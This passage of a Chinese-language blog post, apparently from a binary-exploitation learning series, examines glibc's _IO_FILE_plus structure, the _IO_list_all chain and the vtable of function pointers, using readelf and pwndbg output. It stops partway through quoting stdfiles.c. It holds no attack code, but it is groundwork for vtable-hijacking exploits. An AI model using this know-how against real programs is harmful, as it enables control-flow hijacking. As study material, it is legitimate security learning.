&lt;p&gt;readelf -s &amp;#x2F;lib&amp;#x2F;x86_64-linux-gnu&amp;#x2F;libc.so.6 | grep write@&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_2_1_stderr_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_2_1_stdout_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_2_1_stdin_&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwn&lt;span class=&#34;meta&#34;&gt;# readelf -s /lib/x86_64-linux-gnu/libc.so.6   |grep stdin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;378&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;00000000001&lt;/span&gt;ec980   &lt;span class=&#34;number&#34;&gt;224&lt;/span&gt; OBJECT  GLOBAL DEFAULT   &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt; _IO_2_1_stdin_@@GLIBC_2&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;547&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;00000000001&lt;/span&gt;ed790     &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; OBJECT  GLOBAL DEFAULT   &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;@@GLIBC_2&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwn&lt;span class=&#34;meta&#34;&gt;# readelf -s /lib/x86_64-linux-gnu/libc.so.6   |grep _IO_2_1_st&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;378&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;00000000001&lt;/span&gt;ec980   &lt;span class=&#34;number&#34;&gt;224&lt;/span&gt; OBJECT  GLOBAL DEFAULT   &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt; _IO_2_1_stdin_@@GLIBC_2&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;852&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;00000000001&lt;/span&gt;ed6a0   &lt;span class=&#34;number&#34;&gt;224&lt;/span&gt; OBJECT  GLOBAL DEFAULT   &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt; _IO_2_1_stdout_@@GLIBC_2&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;1427&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;00000000001&lt;/span&gt;ed5c0   &lt;span class=&#34;number&#34;&gt;224&lt;/span&gt; OBJECT  GLOBAL DEFAULT   &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt; _IO_2_1_stderr_@@GLIBC_2&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;FILE-结构&#34;&gt;&lt;a href=&#34;#FILE-结构&#34; class=&#34;headerlink&#34; title=&#34;FILE 结构&#34;&gt;&lt;/a&gt;FILE 结构&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/xy_369/article/details/130874848&#34;&gt;https://blog.csdn.net/xy_369/article/details/130874848&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		关于代码, 代码存在于glibc&amp;#x2F;libio&amp;#x2F;中 主要是libio.h&lt;/p&gt;
&lt;p&gt;​		FILE结构被一系列流操作函数(fopen() fread() fclose())等所使用,大多数的FILE结构保存在堆上(stdin、stdout、stderr除外,位于libc数据段),其指针动态创建并由fopen函数返回&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;h2 id=&#34;IO-FILE-plus&#34;&gt;&lt;a href=&#34;#IO-FILE-plus&#34; class=&#34;headerlink&#34; title=&#34;_IO_FILE_plus&#34;&gt;&lt;/a&gt;_IO_FILE_plus&lt;/h2&gt;&lt;p&gt;​		在libc2.23版本中,这个结构体是_IO_FILE_plus, 包含了一个 _IO_FILE结构体和一个指向 _IO_jump_t结构体的指针vtable&lt;/p&gt;
&lt;p&gt;libioP.h&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* We always allocate an extra word following an _IO_FILE.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   This contains a pointer to the function jump table used.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   This is for compatibility with C++ streambuf; the word can&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   be used to smash to a pointer to a virtual function table. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE_plus&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_FILE file;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_jump_t&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;vtable&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		各种文件结构(   _IO_FILE )采用单链表的形式连接起来( _chain域),通过 _IO_list_all访问&lt;/p&gt;
&lt;p&gt;​		vtable为函数指针结构体,存放着各种IO相关函数的指针&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230807102222274.png&#34; alt=&#34;image-20230807102222274&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
&lt;p&gt;像_IO_FILE_plus这种这么打印呢&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7ffff7fb05a0&lt;/span&gt; &amp;lt;_IO_list_all&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;  p /x *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus*) _IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;0xfbad2086&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x7ffff7fb06a0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0xffffffffffffffff&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x7ffff7fb17d0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;0xffffffffffffffff&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x7ffff7faf780&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; times&amp;gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7ffff7fac4a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p /x *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_jump_t*) _IO_list_all.vtable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0x7ffff7e52f50&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0x7ffff7e53d80&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0x7ffff7e53a20&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0x7ffff7e54f50&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0x7ffff7e56680&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0x7ffff7e525d0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0x7ffff7e52240&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0x7ffff7e51860&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0x7ffff7e55600&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0x7ffff7e51530&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0x7ffff7e513c0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0x7ffff7e44c70&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0x7ffff7e525a0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0x7ffff7e51e60&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0x7ffff7e51600&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0x7ffff7e51520&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0x7ffff7e51e40&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0x7ffff7e56810&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0x7ffff7e56820&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;初始情况&#34;&gt;&lt;a href=&#34;#初始情况&#34; class=&#34;headerlink&#34; title=&#34;初始情况&#34;&gt;&lt;/a&gt;初始情况&lt;/h2&gt;&lt;p&gt;​		初始情况下_IO_FILE 结构有&lt;code&gt;_IO_2_1_stderr_&lt;/code&gt; ，&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;，&lt;code&gt;_IO_2_1_stdin_&lt;/code&gt; 三个,通过 &lt;code&gt;_IO_list_all&lt;/code&gt;连接起来&lt;/p&gt;
&lt;p&gt;stdfiles.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; defined _LIBC || defined _GLIBCPP_USE_WCHAR_T&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#  &lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;  static struct _IO_wide_data _IO_wide_data_##FD \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 